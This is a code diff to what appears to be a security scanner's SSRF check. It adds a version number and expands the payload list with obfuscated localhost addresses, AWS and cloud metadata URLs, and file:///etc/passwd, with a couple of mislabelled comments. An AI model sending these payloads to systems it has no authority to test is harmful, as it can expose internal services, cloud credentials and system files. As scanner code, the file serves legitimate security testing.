@@ -57,6 +57,10 @@ _BENIGN_VALUE = "https://example.com"
 class Scanner(BaseScanner):
     name = "ssrf"
 
+    @property
+    def version(self) -> str:
+        return "1.1"
+
     async def scan(self, ctx: ScanContext) -> AsyncIterator[ScanEvent]:
         url = ctx.target
         client = ctx.client
@@ -143,14 +147,25 @@ class Scanner(BaseScanner):
     @staticmethod
     def _default_payloads() -> list[str]:
         return [
+            # Standard localhost variants
             "http://127.0.0.1",
             "http://127.0.0.1:80",
             "http://127.0.0.1:443",
             "http://localhost",
             "http://0.0.0.0",
             "http://[::1]",
-            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
-            "http://metadata.google.internal/",           # GCP metadata
+            # Bypass variants for localhost (IP format obfuscation)
+            "http://127.1",                                  # Short-form IPv4
+            "http://2130706433",                             # 127.0.0.1 in decimal
+            "http://0x7f000001",                             # 127.0.0.1 in hex
+            "http://0x7f.0x0.0x0.0x1",                       # 127.0.0.1 octal bypasses
+            # AWS metadata
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254",
+            # GCP metadata
+            "http://metadata.google.internal/",
+            "http://169.254.169.254/metadata/v1/instance/",
+            # File access
             "file:///etc/passwd",
             "file:///c:/windows/win.ini",
         ]
